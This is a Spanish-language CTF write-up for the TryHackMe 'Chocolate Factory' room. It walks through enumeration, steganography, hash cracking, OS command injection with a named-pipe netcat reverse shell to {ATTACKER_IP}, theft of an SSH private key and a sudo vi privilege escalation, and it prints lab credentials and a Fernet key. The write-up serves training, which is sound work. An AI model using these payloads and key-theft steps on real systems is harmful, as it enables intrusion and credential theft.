@@ -1,0 +1,379 @@
+---
+title: 'Chocolate Factory'
+description: 'Análisis de un binario con strings, FTP anónimo y esteganografía, command injection para RCE y robo de una clave privada para escalar a root.'
+publishDate: 2026-09-01
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Dificultad:** Easy **Categoría:** Enumeración web, análisis de binarios (`strings`), FTP anónimo, esteganografía, cracking de hashes, command injection (RCE), robo de clave SSH, privesc vía GTFOBins (`vi`), criptografía simétrica (Fernet) **Sala:** temática de «Charlie y la fábrica de chocolate»
+
+## Descripción de la sala
+
+Máquina Linux con temática de _Charlie y la fábrica de chocolate_, cuyo objetivo final es «convertirse en el nuevo dueño de la fábrica» descifrando un mensaje cifrado con una clave que se descubre al principio del reto. El camino combina análisis de un binario ELF, esteganografía en una imagen obtenida por FTP, cracking de hashes, explotación de una vulnerabilidad de **inyección de comandos** en la aplicación web, robo de una clave privada SSH, y una escalada de privilegios clásica documentada en GTFOBins sobre el editor `vi`.
+
+> **Nota sobre placeholders:** se usa `{IP}` / `target` para la IP asignada por TryHackMe (cambia en cada despliegue). `{ATTACKER_IP}` representa la IP de la máquina atacante (necesaria para recibir la reverse shell). El resto de valores (rutas, usuario `charlie`, contraseñas, hashes y la clave Fernet) son fijos en esta máquina.
+
+---
+
+## 1. Preparación del entorno
+
+```bash
+mkdir -p chocolate_factory/{scans,content,scripts,loot,exploits} && cd chocolate_factory
+settarget {IP}
+```
+
+---
+
+## 2. Escaneo de puertos
+
+```bash
+sudo nmap -p- --open -T4 -v -n target -oG scans/allports
+extractPorts scans/allports
+```
+
+- `-p- --open`: escanea todos los puertos TCP y muestra solo los abiertos.
+- `-T4`: temporización agresiva (algo más conservadora que `-T5`, útil si la máquina tiene muchos puertos abiertos y no quieres perder resultados por timeouts).
+- `-v -n`: verboso, sin resolución DNS.
+- `-oG`: salida «grepable» para `extractPorts`.
+
+**Puertos esperados:** 21 (FTP), 22 (SSH), 80 (HTTP), y un rango adicional de puertos «señuelo» (aprox. 100–125) que simulan servicios diversos como parte de la temática de la sala — en la práctica no son relevantes para la explotación, salvo el puerto donde se aloja `key_rev_key`.
+
+Conviene un segundo escaneo con detección de versión sobre los puertos relevantes:
+
+```bash
+nmap -sV -sC -p21,22,80 {IP} -oN scans/detailed-scan
+```
+
+---
+
+## 3. Enumeración web y hallazgo del binario `key_rev_key`
+
+```bash
+gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 30
+```
+
+- `-x php,html,txt,bak`: prueba estas extensiones además de nombres de directorio.
+- `-t 30`: 30 hilos concurrentes.
+
+Además del fuzzing, al navegar la web (o mediante los _banners_/scripts de nmap sobre algunos de los puertos «señuelo») se encuentra una pista textual del tipo:
+
+```
+http://localhost/key_rev_key <- ¡Aquí encontrarás la clave!
+```
+
+Esto lleva a descargar y analizar ese archivo:
+
+```bash
+wget http://target/key_rev_key
+file key_rev_key
+```
+
+`file` debería identificarlo como un **binario ELF**. Al intentar mostrarlo directamente con `cat` es fácil que el terminal se comporte de forma extraña (caracteres binarios sin interpretar), así que se usa `strings` para extraer únicamente el texto legible embebido en el binario:
+
+```bash
+strings key_rev_key > key.txt
+cat key.txt
+```
+
+Entre las cadenas extraídas aparece una clave con formato característico de **Fernet** (biblioteca de criptografía simétrica de Python):
+
+```
+Clave obtenida: -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+```
+
+> Esta clave se usará mucho más adelante, ya al final de la máquina, para descifrar el mensaje final del script `root.py`. Conviene guardarla desde ya en `loot/`.
+
+---
+
+## 4. Acceso FTP anónimo
+
+```bash
+ftp target
+# Usuario: anonymous
+# Contraseña: (en blanco)
+```
+
+Dentro de la sesión:
+
+```
+ftp> ls
+ftp> get gum_room.jpg
+ftp> bye
+```
+
+Se descarga la única imagen disponible en el servidor, `gum_room.jpg` (referencia a la sala de chicles de la fábrica).
+
+---
+
+## 5. Esteganografía en la imagen
+
+```bash
+steghide info gum_room.jpg
+```
+
+Steghide detecta un archivo embebido. En esta máquina **no hay passphrase** (basta con pulsar Enter cuando se solicite):
+
+```bash
+steghide extract -sf gum_room.jpg
+```
+
+El archivo extraído suele ser un texto (por ejemplo `b64.txt`), cuyo nombre ya sugiere que su contenido está en **Base64**. Si el extraído no es directamente legible, se decodifica:
+
+```bash
+base64 -d b64.txt > decoded_data.txt
+cat decoded_data.txt
+```
+
+El contenido decodificado tiene forma de un extracto de archivo `/etc/shadow`: una lista de usuarios con sus hashes de contraseña. Entre ellos aparece la línea correspondiente al usuario **`charlie`**, con su hash y, en algunas variantes de la sala, también una contraseña en texto plano visible directamente en el material esteganografiado:
+
+```
+usuario: charlie
+contraseña: cn7824
+```
+
+---
+
+## 6. Confirmación del hash de Charlie con John
+
+Independientemente de si la contraseña en texto plano ya se obtuvo directamente, conviene **confirmarla** crackeando el hash correspondiente (buena práctica: nunca dar por sentada una credencial sin verificarla contra su hash cuando ambos estén disponibles):
+
+```bash
+echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+```
+
+- El prefijo `$6$` indica un hash **SHA-512crypt**, el formato estándar de `/etc/shadow` en Linux moderno.
+- Guardar la línea completa en formato `usuario:hash` permite que John detecte automáticamente el algoritmo sin necesidad de la bandera `--format`.
+
+**Resultado: `cn7824`** — coincide con la contraseña obtenida en el paso anterior, confirmando que es correcta.
+
+> Con esta contraseña se puede intentar acceder directamente por SSH como `charlie`, pero **no funcionará** todavía: en esta máquina el acceso SSH de `charlie` está restringido a autenticación por clave pública, no por contraseña. Esa contraseña sirve, en cambio, para un formulario de login dentro de la propia aplicación web (`validate.php`), que confirma que vas por el camino correcto pero no es el vector de entrada final.
+
+---
+
+## 7. Explotación de la aplicación web (Command Injection)
+
+Al explorar la aplicación web con más profundidad (más allá de `validate.php`), se encuentra una funcionalidad que ejecuta comandos del sistema en el servidor a partir de una entrada del usuario (por ejemplo, una utilidad tipo «ping» o similar) **sin sanitizar correctamente los caracteres especiales de shell**, lo que constituye una vulnerabilidad de **inyección de comandos del sistema operativo (OS Command Injection)**.
+
+### 7.1 Preparar el listener
+
+```bash
+nc -lvnp 9001
+```
+
+### 7.2 Inyectar el payload de reverse shell
+
+En el campo vulnerable de la aplicación web se envía una reverse shell tipo _named pipe_ (FIFO), muy usada en sistemas donde `bash -i >& /dev/tcp/...` puede no funcionar directamente en `sh`:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ATTACKER_IP} 9001 >/tmp/f
+```
+
+Desglose:
+
+- `rm /tmp/f`: elimina cualquier archivo previo con ese nombre, evitando conflictos si el named pipe ya existía de un intento anterior.
+- `mkfifo /tmp/f`: crea un **named pipe** (archivo especial que actúa como tubería de comunicación entre procesos).
+- `cat /tmp/f | sh -i 2>&1 | nc {ATTACKER_IP} 9001 > /tmp/f`: encadena la tubería para que todo lo que `nc` reciba de la máquina atacante se pase a `sh -i` (shell interactiva), y toda la salida (incluidos errores, `2>&1`) se reenvíe de vuelta a través de `nc` hacia el listener — logrando así una shell interactiva completa en ambas direcciones.
+
+Al enviar esta petición desde el formulario vulnerable, el servidor ejecuta el comando y el listener `nc` recibe la conexión:
+
+```bash
+id
+# uid=33(www-data) gid=33(www-data) ...
+```
+
+---
+
+## 8. Obtener la clave privada SSH de Charlie
+
+Ya con shell como `www-data`, se explora el sistema de archivos en busca de credenciales adicionales:
+
+```bash
+ls -la /home/charlie
+```
+
+Se encuentra un archivo llamado **`teleport`** (y posiblemente `teleport.pub`), que resulta ser una **clave privada SSH** perteneciente a `charlie`, dejada con permisos de lectura demasiado abiertos.
+
+### 8.1 Transferir la clave al atacante
+
+Desde la shell obtenida (como `www-data`), se levanta un servidor HTTP temporal para servir el archivo:
+
+```bash
+cd /home/charlie
+python3 -m http.server 8888
+```
+
+Y desde la máquina atacante, se descarga:
+
+```bash
+wget http://target:8888/teleport
+chmod 600 teleport
+```
+
+- `chmod 600`: SSH rechaza usar claves privadas con permisos demasiado abiertos; se restringe el acceso solo al propietario del archivo.
+
+---
+
+## 9. Acceso SSH como Charlie y flag de usuario
+
+```bash
+ssh -i teleport charlie@{IP}
+```
+
+Una vez dentro:
+
+```bash
+cat /home/charlie/user.txt
+```
+
+---
+
+## 10. Escalada de privilegios
+
+### 10.1 Enumeración de permisos sudo
+
+```bash
+sudo -l
+```
+
+Salida esperada:
+
+```
+User charlie may run the following commands on chocolate-factory:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/PrivEsc
+```
+
+Es decir, `charlie` puede ejecutar `vi` **como root**, pero restringido a abrir un archivo específico (`/var/www/html/PrivEsc`). Esta restricción es, en la práctica, irrelevante: `vi` permite ejecutar comandos de shell desde dentro del propio editor, sin importar qué archivo se le haya indicado abrir — técnica documentada en **GTFOBins** (gtfobins.github.io/gtfobins/vi/).
+
+### 10.2 Explotación
+
+```bash
+sudo vi /var/www/html/PrivEsc
+```
+
+Una vez dentro del editor `vi` (ya ejecutándose con privilegios de root):
+
+1. Pulsar **`Esc`** para asegurarse de estar en modo normal (no en modo inserción).
+2. Escribir el comando: `:!/bin/bash`
+3. Pulsar **Enter**.
+
+La sintaxis `:!comando` en `vi`/`vim` ejecuta un comando de shell **sin salir del editor**, y esa shell hereda los privilegios con los que se está ejecutando `vi` en ese momento — en este caso, **root**.
+
+```bash
+id
+# uid=0(root) gid=1000(charlie) groups=1000(charlie)
+```
+
+---
+
+## 11. Descifrado del mensaje final (`root.py`)
+
+Dentro de `/root` se encuentra un script en Python:
+
+```bash
+cat /root/root.py
+```
+
+Su contenido es aproximadamente:
+
+```python
+from cryptography.fernet import Fernet
+import pyfiglet
+
+key=input("Enter the key: ")
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
+display2=pyfiglet.figlet_format("Chocolate Factory ")
+print(display1)
+print(display2)
+```
+
+El script pide una clave, la usa para instanciar un objeto **Fernet** (criptografía simétrica: la misma clave sirve para cifrar y descifrar), e intenta descifrar el mensaje `encrypted_mess`.
+
+### 11.1 Problemas del script tal como está
+
+Al ejecutarlo directamente con `python3 root.py`, suele fallar por dos motivos técnicos:
+
+1. **`Fernet(key)`** espera que `key` sea de tipo `bytes`, no `str` — al escribirla por `input()` llega como cadena de texto normal.
+2. **`f.decrypt(encrypted_mess)`** también espera `bytes` como entrada, pero `encrypted_mess` está definida en el código como una cadena de texto normal (`'...'`, sin el prefijo `b'...'`).
+
+### 11.2 Corrección del script con `sed`
+
+Se aplican una serie de ediciones en línea para solucionar estos problemas y, de paso, simplificar la salida (quitando el arte ASCII de `pyfiglet`, que no es necesario y puede fallar si la librería no está instalada, para mostrar directamente el mensaje descifrado):
+
+```bash
+sed -i "s/encrypted_mess= '/encrypted_mess= b'/" root.py
+sed -i 's/f=Fernet(key)/f=Fernet(key.encode())/' root.py
+sed -i '/mess=dcrypt_mess.decode()/a print(mess)' root.py
+sed -i 's/^display1=pyfiglet/#display1=pyfiglet/' root.py
+sed -i 's/^display2=pyfiglet/#display2=pyfiglet/' root.py
+sed -i 's/^print(display1)/print(mess)/' root.py
+sed -i 's/^print(display2)/#print(display2)/' root.py
+```
+
+Desglose de cada corrección:
+
+- `encrypted_mess= '` → `encrypted_mess= b'`: convierte la cadena del mensaje cifrado en un literal de **bytes** (`b'...'`), tal como exige `Fernet.decrypt()`.
+- `f=Fernet(key)` → `f=Fernet(key.encode())`: convierte la clave introducida por teclado (`str`) a `bytes` mediante `.encode()`, tal como exige el constructor `Fernet()`.
+- Se añade `print(mess)` justo después de la línea que decodifica el mensaje descifrado, para asegurarnos de que se imprima en pantalla.
+- Se comentan (`#`) las líneas que generan el arte ASCII con `pyfiglet`, evitando dependencias innecesarias.
+- Se reemplazan los `print(display1)` / `print(display2)` originales, dejando solo la impresión del mensaje real descifrado (`mess`).
+
+> Nota: alguna de estas sustituciones duplicadas (`print(mess)` insertado dos veces por distintos `sed`) es intencional como redundancia defensiva del flujo de estos apuntes; en la práctica basta con una sola impresión de `mess` para ver el resultado.
+
+### 11.3 Ejecución final
+
+```bash
+python3 root.py
+```
+
+El script solicitará la clave. Aquí es donde se usa la clave Fernet obtenida **desde el principio de la máquina**, al analizar el binario `key_rev_key`:
+
+```
+Enter the key: -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+```
+
+Si la clave es correcta, `Fernet` descifra el mensaje y se imprime el texto final, confirmando que te has convertido en el «nuevo dueño de la fábrica de chocolate» — el objetivo narrativo/flag de esta sala.
+
+---
+
+## 12. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → FTP (21), SSH (22), HTTP (80) + puertos señuelo.
+2. **Fuzzing web** y pista textual → se descubre y descarga el binario `key_rev_key`.
+3. **Análisis con `strings`** del binario → se extrae una **clave Fernet** (se guardará para usarse al final).
+4. **FTP anónimo** → se descarga `gum_room.jpg`.
+5. **Esteganografía** con `steghide` (sin passphrase) → se extrae un archivo Base64 con datos tipo `/etc/shadow`, revelando usuario y hash de `charlie`.
+6. **Cracking del hash** con `john` → confirma la contraseña `cn7824`.
+7. **Command Injection** en un formulario de la aplicación web → reverse shell como `www-data`.
+8. **Robo de clave privada SSH** (`teleport`) desde `/home/charlie`, servida vía `python3 -m http.server` y descargada con `wget`.
+9. **Acceso SSH** como `charlie` con la clave robada → flag de usuario.
+10. **Escalada de privilegios** vía GTFOBins (`sudo vi ...` → `:!/bin/bash`) → shell de root.
+11. **Corrección de un script Python** (`root.py`) con `sed` para solucionar errores de tipos (`str` vs `bytes`) en el uso de la librería `cryptography.fernet`.
+12. **Descifrado del mensaje final** usando la clave Fernet obtenida al principio → flag/mensaje final de la sala.
+
+## 13. Lecciones aprendidas / conceptos clave
+
+- **`strings` sobre binarios ELF** es una técnica de análisis estático básica pero muy efectiva para encontrar credenciales, claves o rutas hardcodeadas dentro de ejecutables.
+- **FTP anónimo + esteganografía** es un patrón recurrente en máquinas de tipo CTF para ocultar credenciales de forma no trivial.
+- **Nunca confiar en una sola fuente de credenciales**: cruzar la contraseña obtenida por esteganografía con el hash correspondiente (crackeado independientemente) es una buena práctica de verificación.
+- **Inyección de comandos (OS Command Injection)** ocurre cuando una aplicación pasa entrada del usuario directamente a una llamada de sistema (`system()`, `exec()`, `popen()`, etc.) sin sanitizarla; cualquier funcionalidad web que «ejecute» algo en el backend (ping, traceroute, conversores, etc.) es sospechosa y debe probarse con caracteres especiales de shell (`;`, `|`, `&&`, backticks).
+- **Reverse shells vía named pipes (FIFO)** (`mkfifo` + `cat` + `nc`) son una alternativa útil cuando la sintaxis `bash -i >& /dev/tcp/...` no está disponible (por ejemplo, si el intérprete real es `sh` puro sin soporte de `/dev/tcp`).
+- **GTFOBins y `vi`**: cualquier permiso de `sudo` sobre un editor de texto (`vi`, `vim`, `nano` con plugins, etc.) es equivalente a una shell de root completa, gracias a la capacidad de estos editores de ejecutar comandos de shell internamente.
+- **Fernet (de la librería `cryptography`)** es un esquema de cifrado simétrico autenticado; requiere que tanto la clave como el mensaje cifrado estén en formato `bytes`, un detalle común de fallos al copiar/pegar código Python 2 a Python 3 (donde `str` y `bytes` son tipos estrictamente distintos).
+
+## 14. Herramientas utilizadas
+
+`nmap`, `gobuster`, `wget`, `strings`, `file`, cliente `ftp`, `steghide`, `base64`, `john the ripper`, `netcat`, `python3` (servidor HTTP y ejecución de script), `sed`, cliente `ssh`, `vi` (abuso vía GTFOBins).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Chocolate Factory» en TryHackMe, complementada con writeups públicas de la comunidad para explicar el vector de inyección de comandos en la aplicación web y el contenido completo del script `root.py`._
